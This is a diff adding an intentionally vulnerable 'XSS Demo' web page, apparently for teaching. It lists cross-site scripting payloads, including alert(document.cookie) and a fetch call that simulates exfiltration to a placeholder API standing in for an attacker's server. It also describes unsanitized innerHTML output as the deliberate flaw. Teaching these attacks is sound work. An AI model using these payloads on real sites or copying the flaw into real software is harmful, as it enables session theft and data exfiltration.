@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>XSS Demo</title>
+    <style>
+      table {
+        width: 100%;
+        border-collapse: collapse;
+      }
+      td,
+      th {
+        vertical-align: top;
+        padding: 4px 8px 4px 0;
+      }
+      td:first-child {
+        word-break: break-all;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>XSS Demo</h1>
+    <p>
+      This page is intentionally vulnerable. Try searching normally, then try
+      the payloads below.
+    </p>
+    <form method="get" action="/search">
+      <label for="search">Type a query</label>
+      <input type="search" name="query" />
+      <button type="submit">Search</button>
+    </form>
+
+    <hr />
+
+    <h2>Hints</h2>
+    <p>
+      The search page dumps your query into <code>innerHTML</code> unsanitized.
+      Copy a payload into the search box.
+    </p>
+    <table>
+      <thead>
+        <tr>
+          <th>Payload</th>
+          <th>What it does</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+          <td>
+            Fires immediately. Broken image triggers <code>onerror</code>.
+          </td>
+          <td>Copy into the search box</td>
+        </tr>
+        <tr>
+          <td><code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></td>
+          <td>Exposes session cookies — the real threat.</td>
+          <td>Copy into the search box</td>
+        </tr>
+        <tr>
+          <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+          <td>SVG fires <code>onload</code> without any user interaction.</td>
+          <td>Copy into the search box</td>
+        </tr>
+        <tr>
+          <td>
+            <code>&lt;a href="javascript:alert(1)"&gt;click me&lt;/a&gt;</code>
+          </td>
+          <td>Requires a click. Classic <code>javascript:</code> URI.</td>
+          <td>Copy into the search box</td>
+        </tr>
+        <tr>
+          <td>
+            <code
+              >&lt;img src=x
+              onerror="fetch('https://jsonplaceholder.typicode.com/users/1').then(r=>r.json()).then(d=>alert('Exfiltrated:
+              '+d.name+' | '+d.email))"&gt;</code
+            >
+          </td>
+          <td>
+            Simulates data exfiltration — makes a real HTTP request and surfaces
+            the response. In a real attack this would be the attacker's server.
+          </td>
+          <td>Copy into the search box</td>
+        </tr>
+        <tr>
+          <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          <td>
+            Does <strong>not</strong> work — browsers block scripts injected via
+            <code>innerHTML</code>.
+          </td>
+          <td>Copy into the search box</td>
+        </tr>
+      </tbody>
+    </table>
+  </body>
+  <footer>
+    <p>Copyright (c) 2026 Stanley Masinde. All Rights Reserved.</p>
+  </footer>
+</html>
